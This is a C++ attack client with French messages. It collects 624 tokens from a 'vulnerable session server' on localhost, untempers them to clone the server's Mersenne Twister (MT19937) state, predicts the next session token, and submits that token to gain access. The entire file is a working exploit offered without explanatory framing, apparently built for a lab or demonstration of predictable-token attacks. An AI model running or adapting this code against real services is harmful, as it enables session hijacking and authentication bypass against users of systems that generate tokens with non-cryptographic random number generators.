#include <iostream>
#include <array>
#include <cstdint>
#include <cstring>
#include <iomanip>
#include "network/socket_raii.hpp"
#include "crypto_analysis/untemperer.hpp"
#include "core/mt19937.hpp"

constexpr std::uint16_t PORT = 8080;
constexpr std::size_t N = 624;

int main() {
    auto socket_opt = CryptoNetwork::SocketRAII::create_tcp_socket();
    if (!socket_opt.has_value()) {
        std::cerr << "[-] Erreur : Création du socket impossible.\n";
        return EXIT_FAILURE;
    }
    CryptoNetwork::SocketRAII attacker_socket = std::move(socket_opt.value());

    if (!attacker_socket.connect_to("127.0.0.1", PORT)) {
        std::cerr << "[-] Erreur : Connexion au serveur impossible sur le port " << PORT << "\n";
        return EXIT_FAILURE;
    }

    std::cout << "[+] Connecté au serveur de session vulnérable.\n";
    std::cout << "[*] Collecte en cours de " << N << " tokens séquentiels...\n";

    std::array<std::uint32_t, N> intercepted_tokens{};
    std::uint8_t req_opcode = 0x01; // Opcode : Demande de Jeton
    std::span<const std::uint8_t> req_span(&req_opcode, 1);

    for (std::size_t i = 0; i < N; ++i) {
        if (!attacker_socket.send_all(req_span)) {
            std::cerr << "[-] Erreur réseau lors de l'envoi de l'opcode 0x01.\n";
            return EXIT_FAILURE;
        }

        std::array<std::uint8_t, 4> token_bytes{};
        if (!attacker_socket.recv_exact(token_bytes)) {
            std::cerr << "[-] Erreur réseau lors de la réception du token.\n";
            return EXIT_FAILURE;
        }

        std::memcpy(&intercepted_tokens[i], token_bytes.data(), sizeof(std::uint32_t));
    }

    std::cout << "[+] Collecte terminée. Extraction de l'état interne distant...\n";
    std::array<std::uint32_t, N> cloned_state{};
    CryptoAnalysis::Untemperer::clone_state(intercepted_tokens, cloned_state);

    // Synchronisation du clone local
    CryptoCore::MT19937 local_clone;
    local_clone.set_state(cloned_state);
    std::cout << "[+] Générateur local synchronisé sur l'état du serveur.\n";

    // Prédiction mathématique du jeton suivant (Index 625)
    std::uint32_t predicted_token = local_clone.next_u32();
    std::cout << "[*] Token prédit pour la session suivante : 0x" 
              << std::hex << std::uppercase << std::setw(8) << std::setfill('0') << predicted_token << "\n";

    // Forcer le serveur à générer son 625ème jeton pour vérification
    std::cout << "[*] Requête du 625ème token au serveur pour confrontation...\n";
    if (!attacker_socket.send_all(req_span)) {
        return EXIT_FAILURE;
    }

    std::array<std::uint8_t, 4> actual_token_bytes{};
    if (!attacker_socket.recv_exact(actual_token_bytes)) {
        return EXIT_FAILURE;
    }

    std::uint32_t actual_server_token = 0;
    std::memcpy(&actual_server_token, actual_token_bytes.data(), sizeof(std::uint32_t));
    std::cout << "[+] Token réel émis par le serveur         : 0x" << actual_server_token << "\n";

    if (predicted_token != actual_server_token) {
        std::cerr << "[-] ÉCHEC : Divergence d'état entre le modèle et la cible.\n";
        return EXIT_FAILURE;
    }
    std::cout << "[+] ÉTAPES DE PRÉDICTION VALIDÉES AVEC SUCCÈS.\n\n";

    // Phase finale : Usurpation via l'Opcode 0x02 (Authentification)
    std::cout << "[*] Soumission du token piraté via l'opcode de vérification (0x02)...\n";
    std::array<std::uint8_t, 5> verify_packet{};
    verify_packet[0] = 0x02; // Opcode de vérification
    std::memcpy(verify_packet.data() + 1, &predicted_token, sizeof(predicted_token));

    if (!attacker_socket.send_all(verify_packet)) {
        std::cerr << "[-] Erreur lors de l'envoi du paquet de vérification.\n";
        return EXIT_FAILURE;
    }

    std::uint8_t auth_status = 0;
    std::span<std::uint8_t> status_span(&auth_status, 1);
    if (!attacker_socket.recv_exact(status_span)) {
        std::cerr << "[-] Erreur lors de la réception du statut d'authentification.\n";
        return EXIT_FAILURE;
    }

    std::cout << "--------------------------------------------------------\n";
    if (auth_status == 0x01) {
        std::cout << "[+] RÉSULTAT : ACCÈS ACCORDÉ. Session compromise à distance.\n";
    } else {
        std::cout << "[-] RÉSULTAT : ACCÈS REFUSÉ. Le token a été rejeté.\n";
    }
    std::cout << "--------------------------------------------------------\n";

    return (auth_status == 0x01) ? EXIT_SUCCESS : EXIT_FAILURE;
}